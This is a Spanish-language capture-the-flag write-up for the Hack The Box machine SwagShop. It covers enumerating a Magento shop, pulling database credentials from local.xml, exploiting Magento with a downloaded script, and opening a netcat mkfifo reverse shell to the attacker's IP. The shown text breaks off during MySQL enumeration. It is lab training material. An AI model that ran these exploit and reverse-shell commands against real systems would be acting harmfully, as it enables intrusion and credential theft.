![host-1](https://user-images.githubusercontent.com/103068924/166836563-b92de273-b0a8-44e3-9796-e0b7aa071b96.png)


# SwagShop

En primer luegar nos creamos un directorio con el nombre de la máquina desde el que trabajaremos:

    sudo mkdir SwagShop
    
Ahora mediante la función [`mkt`](../Herramientas_y_Scripts/mkt.html) que tengo previamente definida en la `zhshrc` crearemos nuestros directorio de trabajo:

    sudo mkt

Esta función está definida para crearnos cuatro directorios (`nmap`, `content`, `exploits` y `scripts`) desde los cuales poder trabajar a la hora de
realizar las máquinas de HTB.

![Captura de pantalla -2022-05-05 08-41-27](https://user-images.githubusercontent.com/103068924/166874377-678da3d9-a60b-4910-ba2b-e73d5f378dd0.png)
    
### PING

Realizamos un `ping` y vemos como nos reporta un ttl=63, por tanto ya sabemos que estamos frente una máquina Linux.

    ping -c 1 10.10.10.140
        
![Captura de pantalla -2022-05-04 21-37-17](https://user-images.githubusercontent.com/103068924/166835523-17862ac7-0b11-48f6-8675-44e7ebbcee95.png)

Ahora vamos a ver mediante `whatweb` que más podemos ver:

    whatweb 10.10.10.140

![Captura de pantalla -2022-05-05 02-39-19](https://user-images.githubusercontent.com/103068924/166848663-edca5cac-63bb-4236-b4b4-cf68c88f8ebf.png)

Vemos que es un sistema Linux Apache 2.4.18 en el cual corre un servicio `http` el cual esta basado en `Magento`.

### ¿Qué es Magento? 

Es una plataforma de comercio en línea, de código abierto (open source) y escrita en PHP, con la que puedes realizar todo tipo de proyectos relacionados a la creación de páginas web de venta en Internet.

Es una  herramienta para el diseño y desarrollo de tu tienda online, permitiéndote una gestión avanzada de distintas áreas, incluyendo el marketing y el posicionamiento web.

### NMAP

Ahora mediante `nmap` realizaremos un escaneo de puertos:

    nmap -p- --open -sS --min-rate 5800 -vvv -n -Pn 10.10.10.140 -oG allPorts2

![Captura de pantalla -2022-05-04 21-47-39](https://user-images.githubusercontent.com/103068924/166835539-0b60bbd9-0d97-401e-bf58-95cf18c3b16b.png)

Vemos como nos reporta el puerto 80 y el puerto 20.

![Captura de pantalla -2022-05-04 21-48-00](https://user-images.githubusercontent.com/103068924/166835551-74619704-5005-4bfa-8a8e-ada9c5b248f1.png)

Intentamos ver el dominio `http://10.10.10.140/` y vemos como nos redirige hasta `swagshop.htb` pero no nos permite ver la página. Para ello vamos
a registrar el dominio en nuestra carpeta `/etc/hosts` e introducimos la Ip de la máquina víctima y el host `swagshop.htb`:

![Captura de pantalla -2022-05-05 00-29-52](https://user-images.githubusercontent.com/103068924/166835861-a5bb2cab-8754-4ba7-a402-d8e06a4da5fe.png)

![Captura de pantalla -2022-05-05 00-31-02](https://user-images.githubusercontent.com/103068924/166835950-11b74920-c3be-4e09-9479-2852ca6de8f0.png)

![Captura de pantalla -2022-05-04 21-51-26](https://user-images.githubusercontent.com/103068924/166836019-63d932b1-f316-4008-8556-2e534a149e80.png)

    sudo nano /etc/hosts
    
![Captura de pantalla -2022-05-05 00-33-07](https://user-images.githubusercontent.com/103068924/166836367-a0023b47-bba6-49ae-90b6-dc134d54563a.png)

 ![Captura de pantalla -2022-05-05 00-34-01](https://user-images.githubusercontent.com/103068924/166836400-df5e6f85-f7ff-4a41-8a44-1ef99793fa23.png)
    
Ahora volvemos a nuestro buscador y vemos como ya nos muestra la página.

![Captura de pantalla -2022-05-05 00-34-40](https://user-images.githubusercontent.com/103068924/166836426-d24198d0-c201-4f08-8389-160da3d98691.png)

Pasamos a revisar la página. Como podemos ver la página es bastante funcional,se trata de una página de venta de productos de HTB, contiene varios enlaces y podemos ver como nos permite comprar y tratar de registranos

### Gobuster

En primer lugar, usando la herramienta `gobuster` vamos a tratar de realizar un escaneo genera en busca de alguna ruta que no se nos muestre en la página.

En caso de no tener la herramienta la instalamos:

    sudo apt install gobuster

Para ello especificaremos el dominio de la víctima y el diccionario de rutas que vamos a utilizar. En este caso vamos a utilizar un diccionario llamado `directory-list-2.3-medium.txt` en cual es parte del repositorio `seclists`

Para descargar el repositorio:

    sudo apt install seclists
    
Ya tenemos `gobuster` y el repositorio `seclists`, ahora procederemos con el escaneo:    

    gobuster dir -u http://10.10.10.140 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    
`dir` : Se utiliza para especificar la opción de directorios.

`-u` : Se utiliza para especificar una `url`.

`-w` : Especifica el diccionario que vamos a utilizar.

![Captura de pantalla -2022-05-05 00-52-50](https://user-images.githubusercontent.com/103068924/166838244-3192932e-4622-4025-b308-a1ed407dab98.png)

Podemos ver que nos reporta una serie de directorios. Tras revisarlos, veo que el directorio `app` contiene otros directorios. 

![Captura de pantalla -2022-05-05 00-56-51](https://user-images.githubusercontent.com/103068924/166838568-e8ea2e18-29aa-4d63-a2fd-4c980c81cf09.png)

Esto podemos confirmarlo
volviendo a pasar el `gobuster` e incluyendo el directio `app` en la url.

![Captura de pantalla -2022-05-05 01-01-17](https://user-images.githubusercontent.com/103068924/166838976-29735406-7024-4fde-a886-ffdddc691719.png)

Vamos a tratar de acceder al directorio `app` desde el navegador.

![Captura de pantalla -2022-05-04 22-45-46](https://user-images.githubusercontent.com/103068924/166839104-d366e1de-3b61-4e96-adc9-ecfbc824cb1e.png)

Tras ir revisando los directirios, encontramos que dentro de `etc/` en el 
archivo `local.xml` econtramos una credenciales.

![Captura de pantalla -2022-05-05 01-04-03](https://user-images.githubusercontent.com/103068924/166839564-e6fa7c34-2b81-4424-9f65-56f3e87c174b.png)

![Captura de pantalla -2022-05-05 01-04-49](https://user-images.githubusercontent.com/103068924/166839569-3b55ab18-e7d0-472f-be35-799a047bfd6d.png)

Vemos como nos reporta un username como `root` y una password:

![Captura de pantalla -2022-05-05 01-04-59](https://user-images.githubusercontent.com/103068924/166839580-c73b2080-e56c-4ecb-936f-db53283bd1a2.png)

Guardaremos esta información en caso de que nos sea util más tarde. Ahora vamos a tratar de generar una reverse shell. Buscando reportes de  vulnerabilidades sobre Magento, encuentro en github la siguiente herramienta
escrita en python3, la cual nos permite crear una reverse shell en paginas creadas con Magento. Para ello la herramienta nos registra automaticamente con el nombre y contraseña que le proporcionemos. Por defecto nos define
`str` tanto como usuario como contraseña.

Para descargar la herramienta en nuesto dierectorio actual:
 
    wget https://raw.githubusercontent.com/epi052/htb-scripts-for-retired-boxes/master/swagshop/magento-oneshot.py
    
Ahora tenemos que darle permiso de ejecución:

    sudo chmod +x magento-oneshot.py
    
Ya tenemos nuestra herramienta preparada, ahora solo debemos especificar el host de la víctima `http://swagshop.htb/index.php` y el comando que queramos ejecutar:    

    python3 magento-oneshot.py --command whoami http://swagshop.htb/index.php

`--command` : Se usa para especificar un comando. En nuestro caso `whoami`.

![Captura de pantalla -2022-05-05 01-40-05](https://user-images.githubusercontent.com/103068924/166850027-4e6b9fee-65ad-4251-9b89-fd25e3fc4ad5.png)

Vemos como funciona perfectamente y como nos reconoce como `www-data`.

Desde aquí ya podriamos hacer cositas, reportando distintos comando podríamos 
ir interacuando con el sistema pero no es practico. Para poder trabajar bien
vamos a tratar de montar una shell mñas cómoda.

Para ello vamos a ver primero si disponemos de `netcat` para tratar de establer una reverse shell:

    python3 magento-oneshot.py --command "wich nc" http://swagshop.htb/index.php

Vemos que si disponemos de netcat. Ahora vamos a tratar de establecer una 
reverse shell. En el siguiente enlace, podreis ver una gran repertorio
de herramientas desde las que establecer shells inversas.

Nosotros vamos a utilizar la de Netcat:

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    
![Captura de pantalla -2022-05-05 01-46-13](https://user-images.githubusercontent.com/103068924/166850489-e62e07a6-eda5-4ef7-9759-723deff77eec.png)

Pimero preparamos en una terminal a parte, con nuestro comando netcat `nc` en escucha por el puerto `8080`.

    nc -lnvp 8080
    
 ![Captura de pantalla -2022-05-05 09-09-31](https://user-images.githubusercontent.com/103068924/166876948-fc9519f0-429a-4a41-b23f-86b89ec86d43.png)
 
Finalmente especificamos el comando que nos reporta el artículo dentro de nuestro comando anterior, tambien especificamos nuestra Ip (En este caso es nuestra vpn de HTB) y el puerto desde el que nos pondremos en escucha, `8080`.
 
    python3 magento-oneshot.py --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8080 >/tmp/f" http://swagshop.htb/index.php
    
![Captura de pantalla -2022-05-05 01-47-38](https://user-images.githubusercontent.com/103068924/166876323-c111416f-50ca-4c3a-920a-9ca6ca1ccb0e.png)

Ya tenemos nuestro shell. Pero sigue sin ser funcional del todo.

![Captura de pantalla -2022-05-05 09-11-59](https://user-images.githubusercontent.com/103068924/166877544-d98100a1-a769-4b12-bb99-7c22b6411983.png)

Para poder obtener una shell completa basada en bash, utilizamos los siguientes comandos:

    script /dev/null -c bash
    
 ![Captura de pantalla -2022-05-05 09-12-36](https://user-images.githubusercontent.com/103068924/166877565-7c129c72-ef1d-4e52-bd19-af03d44d4283.png)

Ahora pulsamos `Cntl + z` enviamos el proceso a segundo plano. Y ejecutamos lo siguiente:

![Captura de pantalla -2022-05-05 09-12-53](https://user-images.githubusercontent.com/103068924/166877674-46b7f844-b2ed-47b9-bfac-4c8fbfa0bc57.png)

Ejecutamos el siguiente comando:
    
    stty raw -echo; fg
    
![Captura de pantalla -2022-05-05 09-13-31](https://user-images.githubusercontent.com/103068924/166877723-7f1282b0-fe27-4b73-b4a7-e4d72d07e97b.png)

    
Y terminamos reseteando la shell:    
    
    reset xterm
    
 ![Captura de pantalla -2022-05-05 09-17-59](https://user-images.githubusercontent.com/103068924/166877905-58e6f441-7889-4d9d-b1d4-386576924715.png)   
    
Ahora ya tenemos una shell más estable y potente. Tambien podemos cerrar la terminal de escucha por `nc` ya que esta 
shell es independiente y no se nos caerá.

Como vemos la shell nos permite utilizar `Cntrl + c` sin expulsarnos pero aún no nos permite utilizar `Cntrl + l` para
limpiar la shell y si utilizamos un `nano`, vemos como tampoco aprovecha todo el monitor.

Aún que con esta shell ya se podría realizar las tareas restantes perfectamente, voy a mostrar como solucionar estos dos pequeños inconvenientes y así tener la shell al 100% funcional.

Para ello primero solucionaremos el problema del `Cntrl +l` de la siguiente manera, si realizamos un `echo $TERM` vemos que tiene el valor `dumb`
y nosotros queremos que igual que nuestra shell, valga `xterm`:

    echo $TERM
 
 ![Captura de pantalla -2022-05-05 09-38-24](https://user-images.githubusercontent.com/103068924/166882012-75e7c979-d17f-49da-b452-1eabf8c29dfa.png)

 
Vemos como nos reporta `dump`. Para cambiarlo introducimos el siguiente comando:

    TERM=xterm
  
![Captura de pantalla -2022-05-05 09-38-46](https://user-images.githubusercontent.com/103068924/166882034-d54cce35-d4ea-4fb5-96fa-52525ab3c4d0.png)

  
Ahora ya podremos limpiar la pantalla mediante `Cntrl + l`. Bien, ya solo falta regular el ancho y la altura de nuesta
shell, para ello primero debemos conocer que medidas tiene nuestro monitor para porder ajustarlo, para verlo, abrimos una terminal nueva desde nuestros directorio e intruducimos:

    stty size
    
![Captura de pantalla -2022-05-05 09-39-53](https://user-images.githubusercontent.com/103068924/166882118-30d9ed4c-860c-4570-a012-cb01760ab413.png)

    
Copiamos los dos números. Ahora volvemos a la reverse shell y podemos ver mediante el mismo comando que las proporciones son mucho menores. Para ajustarlo ralizamos lo siguiente:

    stty size
    
![Captura de pantalla -2022-05-05 09-40-18](https://user-images.githubusercontent.com/103068924/166882143-f5956c0b-4082-47f9-ac74-d434ad66b244.png)

    stty rows 36 columns 133
    
![Captura de pantalla -2022-05-05 09-41-31](https://user-images.githubusercontent.com/103068924/166882227-b7499110-b554-4723-bd39-0a0f0a107bf9.png)

### Búsqueda de la primera Flag

Una vez tengamos todo ajustado, vamos a por las flags. Para conseguir la primera, simplemene nos dirigimos al directorio raiz `/`:

    cd /
    
![Captura de pantalla -2022-05-05 09-42-37](https://user-images.githubusercontent.com/103068924/166882396-a0bccd4e-d044-46f1-a1bb-eede2f31b9db.png)
     
Y vamos a la carpeta `/home/haris` donde econtraremos el primer archivo `user.txt` con la primera flag.    
    
![Captura de pantalla -2022-05-05 09-43-43](https://user-images.githubusercontent.com/103068924/166882451-e9cfb587-c226-41ee-9de7-4db5ff5fd93e.png)

## Búsqueda de la segunda Flag

# Escalada de Privilegios.

Ahora nos faltaría autentificarnos como `root`. Tras comprobar que no funcionan las credenciales previamente recopiladas para conectarnos de forma
directa como `root`, vamos a tratar de utilizarlas para conectarnos mediante
`mysql`.

    mysql -uroot -p
    
![Captura de pantalla -2022-05-05 02-03-56](https://user-images.githubusercontent.com/103068924/166876538-a70e3882-fcc1-41e8-b8e4-bf7df5866ab0.png)
    
![Captura de pantalla -2022-05-05 02-04-07](https://user-images.githubusercontent.com/103068924/166851358-ed5dd0e2-c444-4863-b67b-14da258c33a0.png)

Genial, ahora vemos como la password conseguida anteriormente en la base de datos dentro del archivo `local.xml` nos permite conectarnos.

Una vez dentro de `mysql` vamos a ver las bases de datos:

    show databases;
    
![Captura de pantalla -2022-05-05 02-07-44](https://user-images.githubusercontent.com/103068924/166851562-c968d37b-05e9-4cb5-a7ab-30d3a4a27b0e.png)
 
Vemos como existe una base de datos llamada como la máquina `swagshop`. Intentemos ver sus tablas. Para ello primero ingresamos a ella mediante `use`:

    use swagshop;
    
 ![Captura de pantalla -2022-05-05 02-08-13](https://user-images.githubusercontent.com/103068924/166851750-9e57a5c0-80dd-4d4e-8c85-a2792a392f13.png)
   
Y ahora visualizamos las tablas:

    show tables;
    
    
![Captura de pantalla -2022-05-05 02-08-48](https://user-images.githubusercontent.com/103068924/166851761-301986d3-9d61-4d90-8e09-b37fc0f94236.png)

Vemos como se nos reportan un monton, pero una de las más interesantes es `admin_user`. Para ver mas información:

    describe admin_user;
    
    
![Captura de pantalla -2022-05-05 02-19-31](https://user-images.githubusercontent.com/103068924/166852292-ce2463a1-2c01-4e04-9ebf-1c157e38df85.png)


    
